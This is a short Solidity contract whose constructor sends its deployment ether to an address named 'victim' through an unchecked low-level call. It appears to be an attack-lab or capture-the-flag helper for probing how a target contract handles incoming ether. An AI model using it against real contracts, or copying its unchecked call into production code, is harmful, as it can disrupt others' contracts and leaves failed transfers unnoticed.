pragma solidity ^0.8.0;

contract NoTransfers{
    constructor(address payable victim) payable{
        (bool success, ) = address(victim).call{value: msg.value}("");
    }
}
